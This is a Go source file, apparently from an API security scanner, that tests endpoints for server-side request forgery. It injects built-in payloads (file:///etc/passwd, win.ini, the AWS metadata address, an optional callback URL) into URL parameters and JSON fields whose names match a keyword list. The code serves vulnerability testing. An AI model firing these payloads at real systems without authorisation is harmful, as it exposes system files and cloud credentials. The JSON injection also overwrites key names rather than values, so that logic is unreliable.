package ssrf

import (
	"net/http"
	"regexp"
	"strings"

	"github.com/qiwentaidi/trailblazer/pkg/config"
	"github.com/qiwentaidi/trailblazer/pkg/core/structs"
	"github.com/qiwentaidi/trailblazer/pkg/core/vuln"

	httputil "github.com/qiwentaidi/utils/http"
)

// SSRFResult 表示 SSRF 测试结果
type SSRFResult struct {
	Vulnerable bool   `json:"vulnerable"`
	Payload    string `json:"payload"`
	Response   string `json:"response"`
	Reason     string `json:"reason"`
	// DispatchedCallback 为 true 表示已向回连地址发出探测，
	// 是否命中需要在回连服务端带外确认。
	DispatchedCallback bool `json:"dispatchedCallback,omitempty"`
}

// ssrfProbe 内置探测载荷：payload + 命中判定。
// 判定只认"服务端实际取回了目标内容"的指纹，不接受状态码/重定向等弱信号。
type ssrfProbe struct {
	payload string
	// regexes 任一命中即判定（响应体）
	regexes []*regexp.Regexp
	// words 任一命中即判定（响应体）
	words   []string
	comment string
}

// builtinProbes 内置 SSRF 探测集，覆盖回显型（example.com）、
// 本地文件读取（file://）、云元数据（AWS）三类可带内确认的场景。
var builtinProbes = []ssrfProbe{
	{
		payload: "http://example.com",
		words:   []string{"<title>Example Domain</title>"},
		comment: "回显型 SSRF（外网）",
	},
	{
		payload: "https://example.com",
		words:   []string{"<title>Example Domain</title>"},
		comment: "回显型 SSRF（HTTPS）",
	},
	{
		payload: "file:///etc/passwd",
		regexes: []*regexp.Regexp{regexp.MustCompile(`root:.{0,32}:0:0:`)},
		comment: "本地文件读取（/etc/passwd）",
	},
	{
		payload: "file:///c:/windows/win.ini",
		words:   []string{"[fonts]", "[extensions]"},
		comment: "本地文件读取（win.ini）",
	},
	{
		payload: "http://169.254.169.254/latest/meta-data/",
		regexes: []*regexp.Regexp{regexp.MustCompile(`(?m)^(ami-id|instance-id|instance-type|iam|local-hostname)`)},
		comment: "云元数据（AWS）",
	},
}

// defaultParamKeywords 内置的 SSRF 敏感参数名。
var defaultParamKeywords = []string{
	"url", "uri", "link", "href", "src", "path", "file", "page", "redirect", "forward",
	"target", "dest", "destination", "next", "continue", "return", "callback", "callback_url",
	"callbackUrl", "return_url", "returnUrl", "redirect_url", "redirectUrl", "forward_url",
	"forwardUrl", "next_url", "nextUrl", "continue_url", "continueUrl", "target_url",
	"targetUrl", "dest_url", "destUrl", "destination_url", "destinationUrl", "page_url",
	"pageUrl", "file_url", "fileUrl", "path_url", "pathUrl", "link_url", "linkUrl",
	"href_url", "hrefUrl", "src_url", "srcUrl", "uri_url", "uriUrl", "url_url", "urlUrl",
}

// TestServerSideRequestForgery 测试服务端请求伪造漏洞。
// 载荷与判定指纹均为内置；cfg 只需提供开关、可选参数关键词覆盖和
// 可选回连地址（CallbackURL）。
func TestServerSideRequestForgery(apiReq structs.APIRequest, cfg config.SSRFConfig) (*SSRFResult, error) {
	result := &SSRFResult{Vulnerable: false, Reason: "未检测到SSRF漏洞"}

	for _, probe := range builtinProbes {
		if vulnerable, response := tryProbe(apiReq, cfg, probe.payload, probe.matched); vulnerable {
			result.Vulnerable = true
			result.Payload = probe.payload
			result.Response = response
			result.Reason = "检测到SSRF漏洞（" + probe.comment + "）"
			return result, nil
		}
	}

	// 回连探测：带外确认，带内无法判断，只记录已派发
	if callback := strings.TrimSpace(cfg.CallbackURL); callback != "" {
		modifiedReq := injectSSRFPayload(apiReq, callback, cfg.ParamKeywords)
		if _, err := vuln.SendAPIRequest(modifiedReq, false); err == nil {
			result.DispatchedCallback = true
			result.Reason = "带内探测未命中，已向回连地址派发探测，请在回连服务端确认"
		}
	}

	return result, nil
}

// matched 判定响应体是否命中该 probe 的指纹。
func (p ssrfProbe) matched(body string) bool {
	for _, re := range p.regexes {
		if re.MatchString(body) {
			return true
		}
	}
	for _, word := range p.words {
		if strings.Contains(body, word) {
			return true
		}
	}
	return false
}

// tryProbe 注入单个载荷并判定响应。返回命中的截断响应。
func tryProbe(apiReq structs.APIRequest, cfg config.SSRFConfig, payload string, matched func(string) bool) (bool, string) {
	modifiedReq := injectSSRFPayload(apiReq, payload, cfg.ParamKeywords)
	resp, err := vuln.SendAPIRequest(modifiedReq, false)
	if err != nil {
		return false, ""
	}

	// 302 且 Location 就是注入的载荷，说明只是原样跳转，未发生服务端取回
	if resp.StatusCode() == 302 {
		rawHeaders := httputil.DumpResponseHeadersOnly(resp.RawResponse)
		if strings.Contains(string(rawHeaders), "Location: "+payload) {
			return false, ""
		}
	}

	body := string(resp.Body())
	if resp.StatusCode() == http.StatusOK && matched(body) {
		return true, vuln.TruncateResponse(body)
	}
	return false, ""
}

// injectSSRFPayload 将载荷注入到API请求中
func injectSSRFPayload(apiReq structs.APIRequest, payload string, paramKeywords []string) structs.APIRequest {
	modifiedReq := apiReq

	// 如果参数关键词为空，使用内置关键词
	if len(paramKeywords) == 0 {
		paramKeywords = defaultParamKeywords
	}

	// 尝试在URL参数中注入
	if modifiedReq.Params != nil {
		for key := range modifiedReq.Params {
			for _, keyword := range paramKeywords {
				if strings.Contains(strings.ToLower(key), strings.ToLower(keyword)) {
					modifiedReq.Params[key] = []string{payload}
					break
				}
			}
		}
	}

	// 尝试在请求体中注入
	if modifiedReq.Body != "" {
		// 简单的JSON注入
		if strings.Contains(modifiedReq.Body, "{") && strings.Contains(modifiedReq.Body, "}") {
			for _, keyword := range paramKeywords {
				if strings.Contains(strings.ToLower(modifiedReq.Body), strings.ToLower(keyword)) {
					modifiedReq.Body = strings.Replace(modifiedReq.Body, `"`+keyword+`"`, `"`+payload+`"`, 1)
					break
				}
			}
		}
	}

	return modifiedReq
}
